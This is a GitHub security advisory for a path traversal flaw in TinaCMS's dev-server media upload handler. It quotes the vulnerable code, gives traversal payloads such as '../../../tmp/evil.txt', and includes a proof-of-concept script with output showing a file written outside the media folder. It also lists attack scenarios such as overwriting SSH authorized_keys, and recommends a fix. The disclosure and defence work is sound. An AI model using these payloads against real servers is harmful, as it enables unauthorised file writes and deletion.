# [H] Tina: Path Traversal in Media Upload Handle

## Summary
Severity: High
Advisory: GHSA-5hxf-c7j4-279c
CVE: CVE-2026-28791
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-03-12
Source: https://github.com/advisories/GHSA-5hxf-c7j4-279c
Type: github-advisory

## Affected
- npm: `tinacms` — affected >=0 <2.1.7

## Details
## Affected Package

| Field | Value |
|-------|-------|
| **Package** | `@tinacms/cli` |
| **Version** | `2.0.5` (latest at time of discovery) |
| **Vulnerable File** | `packages/@tinacms/cli/src/next/commands/dev-command/server/media.ts` |
| **Vulnerable Lines** | 42-43 |

---

## Summary

A **path traversal vulnerability (CWE-22)** exists in the TinaCMS development server's media upload handler. The code at `media.ts:42-43` joins user-controlled path segments using `path.join()` without validating that the resulting path stays within the intended media directory. This allows writing files to arbitrary locations on the filesystem.

**Attack Vector**: Network (HTTP POST request)  
**Impact**: Arbitrary file write, potential Remote Code Execution

---

## Details

### Vulnerable Code Location

**File**: `packages/@tinacms/cli/src/next/commands/dev-command/server/media.ts`  
**Lines**: 42-43

```typescript
bb.on('file', async (_name, file, _info) => {
  const fullPath = decodeURI(req.url?.slice('/media/upload/'.length));  // Line 42
  const saveTo = path.join(mediaFolder, ...fullPath.split('/'));        // Line 43
  // make sure the directory exists before writing the file
  await fs.ensureDir(path.dirname(saveTo));
  file.pipe(fs.createWriteStream(saveTo));
});
```

### Root Cause

The `path.join()` function resolves `..` (parent directory) segments in the path. When the user-supplied path contains traversal sequences like `../../../etc/passwd`, these are resolved relative to the media folder, allowing escape to arbitrary filesystem locations.

**Example**:
```javascript
const mediaFolder = '/app/public/uploads';
const maliciousInput = '../../../tmp/evil.txt';
const saveTo = path.join(mediaFolder, ...maliciousInput.split('/'));
// Result: '/tmp/evil.txt' - OUTSIDE the media folder!
```

### Additional Affected Endpoints

The same vulnerability pattern exists in:

1. **Delete Handler** (`handleDelete`, lines 29-33) - Arbitrary file deletion
2. **List Handler** (`handleList`, lines 16-27) + `MediaModel.listMedia` - Directory enumeration
3. **MediaModel.deleteMedia** (lines 201-217) - Arbitrary file deletion

Similar code also exists in the Express version at:
- `packages/@tinacms/cli/src/server/routes/index.ts`
- `packages/@tinacms/cli/src/server/models/media.ts`

---

## PoC

### Quick Verification (No Server Required)

This Node.js script directly tests the vulnerable code logic:

```javascript
#!/usr/bin/env node
/**
 * TinaCMS Path Traversal Vulnerability - Direct Code Test
 * Run: node test-vulnerability.js
 */

const path = require('path');
const fs = require('fs');

// Simulated configuration (matches typical TinaCMS setup)
const rootPath = '/tmp/tinacms-test';
const publicFolder = 'public';
const mediaRoot = 'uploads';
const mediaFolder = path.join(rootPath, publicFolder, mediaRoot);

// Setup test directories
fs.mkdirSync(path.join(rootPath, publicFolder, mediaRoot), { recursive: true });
fs.mkdirSync('/tmp/target-dir', { recursive: true });

console.log(`Media folder: ${mediaFolder}`);

// Simulate vulnerable code from media.ts:42-43
function vulnerableUpload(reqUrl) {
    const fullPath = decodeURI(reqUrl.slice('/media/upload/'.length));
    const saveTo = path.join(mediaFolder, ...fullPath.split('/'));
    return saveTo;
}

// Test cases
const tests = [
    { url: '/media/upload/image.png', desc: 'Normal upload' },
    { url: '/media/upload/../../../tmp/target-dir/evil.txt', desc: 'Path traversal' },
];

tests.forEach(test => {
    const result = vulnerableUpload(test.url);
    const isVuln = !path.resolve(result).startsWith(path.resolve(mediaFolder));
    
    console.log(`\n${test.desc}:`);
    console.log(`  Input: ${test.url}`);
    console.log(`  Result: ${result}`);
    console.log(`  Vulnerable: ${isVuln ? 'YES ⚠️' : 'No ✓'}`);
    
    if (isVuln) {
        // Actually write the file to prove it works
        fs.mkdirSync(path.dirname(result), { recursive: true });
        fs.writeFileSync(result, `PWNED at ${new Date().toISOString()}`);
        console.log(`  File written: ${fs.existsSync(result)}`);
    }
});

// Cleanup
fs.rmSync(rootPath, { recursive: true, force: true });
```

### Output

```
Media folder: /tmp/tinacms-test/public/uploads

Normal upload:
  Input: /media/upload/image.png
  Result: /tmp/tinacms-test/public/uploads/image.png
  Vulnerable: No ✓

Path traversal:
  Input: /media/upload/../../../tmp/target-dir/evil.txt
  Result: /tmp/tmp/target-dir/evil.txt
  Vulnerable: YES ⚠️
  File written: true
```

The file was successfully written to `/tmp/tmp/target-dir/evil.txt`, which is **completely outside** the intended media folder at `/tmp/tinacms-test/public/uploads`.

### Important Note: HTTP Layer vs Code Vulnerability

I want to be transparent about my findings:

**What I observed:**
- When testing via HTTP requests against the Vite dev server, path traversal sequences (`../`) are normalized by Node.js/Vite's HTTP layer *before* reaching the vulnerable code
- This means direct HTTP exploitation like `curl POST /media/upload/../../../tmp/evil.txt` is mitigated in the default configuration

**Why this is still a valid vulnerability that should be fixed:**

1. **The code itself has no validation** - If the path reaches the handler (via any vector), it will be exploited
2. **Defense-in-depth principle** - Security should not rely solely on HTTP normalization
3. **Inconsistent protection** - Your GraphQL layer (`addPendingDocument`) explicitly validates paths and rejects `../` (see test at `packages/@tinacms/graphql/tests/pending-document-validation/index.test.ts:59`), but the media endpoints don't have equivalent protection
4. **Different deployment contexts**:
   - Reverse proxies (nginx, Apache) with `proxy_pass` may preserve raw paths
   - Custom server configurations
   - Future refactoring that uses this code differently
5. **The `parseMediaFolder` helper** (line 66-74) shows intent to restrict paths - the upload handler should have similar restrictions
6. **Express version also affected** - `packages/@tinacms/cli/src/server/routes/index.ts` has the same pattern

---

### Evidence That Path Traversal Should Be Blocked

Your codebase already shows that path traversal is considered a security issue:

```typescript
// From: packages/@tinacms/graphql/tests/pending-document-validation/index.test.ts:52-70
it('handles validation error for invalid path format', async () => {
  const { query } = await setupMutation(__dirname, config);

  const invalidPathMutation = `
    mutation {
      addPendingDocument(
        collection: "post"
        relativePath: "../invalid-path.md"  // <-- Path traversal is rejected!
      ) {
        __typename
      }
    }
  `;

  const result = await query({ query: invalidPathMutation, variables: {} });

  expect(result.errors).toBeDefined();
  expect(result.errors?.length).toBeGreaterThan(0);
});
```

This test explicitly verifies that `../invalid-path.md` is rejected in the GraphQL layer. The media upload endpoints should have the same protection.

---

## Impact

### Who is Affected

- Developers running TinaCMS in development mode
- Any deployment exposing the TinaCMS dev server API
- Particularly concerning if dev servers are exposed to networks (common for mobile testing)

### Potential Attack Scenarios

1. **Remote Code Execution**: Write malicious files to executable locations
   - Overwrite `~/.ssh/authorized_keys` for SSH access
   - Modify application source code
   - Create cron jobs or systemd services

2. **Denial of Service**: Delete critical application or system files

3. **Information Disclosure**: List directory contents outside the media folder

### CVSS Score Estimate

**CVSS 3.1 Base Score: 8.1 (High)**
- Attack Vector: Network (AV:N)
- Attack Complexity: Low (AC:L)  
- Privileges Required: None (PR:N)
- User Interaction: None (UI:N)
- Scope: Unchanged (S:U)
- Confidentiality: None (C:N)
- Integrity: High (I:H)
- Availability: High (A:H)

---

## Recommended Fix

Add path validation to ensure the resolved path stays within the media directory:

```typescript
import path from 'path';

const handlePost = async function (req, res) {
  const bb = busboy({ headers: req.headers });

  bb.on('file', async (_name, file, _info) => {
    const fullPath = decodeURI(req.url?.slice('/media/upload/'.length));
    const saveTo = path.join(mediaFolder, ...fullPath.split('/'));

    // ✅ SECURITY FIX: Validate path stays within media folder
    const resolvedPath = path.resolve(saveTo);
    const resolvedMediaFolder = path.resolve(mediaFolder);

    if (!resolvedPath.startsWith(resolvedMediaFolder + path.sep)) {
      res.statusCode = 403;
      res.end(JSON.stringify({ error: 'Invalid file path' }));
      return;
    }

    await fs.ensureDir(path.dirname(saveTo));
    file.pipe(fs.createWriteStream(saveTo));
  });
  
  // ... rest of handler
};
```

The same fix should be applied to:
- `handleDelete` function
- `handleList` function  
- `MediaModel.listMedia` method
- `MediaModel.deleteMedia` method
- Express router in `packages/@tinacms/cli/src/server/`

### Alternative: Create a Validation Helper

```typescript
function validateMediaPath(userPath: string, mediaFolder: string): string {
  const resolved = path.resolve(path.join(mediaFolder, ...userPath.split('/')));
  const resolvedBase = path.resolve(mediaFolder);
  
  if (!resolved.startsWith(resolvedBase + path.sep) && resolved !== resolvedBase) {
    throw new Error('Path traversal detected');
  }
  
  return resolved;
}
```

---

## References

- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')](https://cwe.mitre.org/data/definitions/22.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [Node.js path.join() Documentation](https://nodejs.org/api/path.html#pathjoinpaths)
- [OWASP Testing Guide - Path Traversal](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include)

## References
- https://github.com/tinacms/tinacms/security/advisories/GHSA-5hxf-c7j4-279c
- https://nvd.nist.gov/vuln/detail/CVE-2026-28791
- https://github.com/tinacms/tinacms
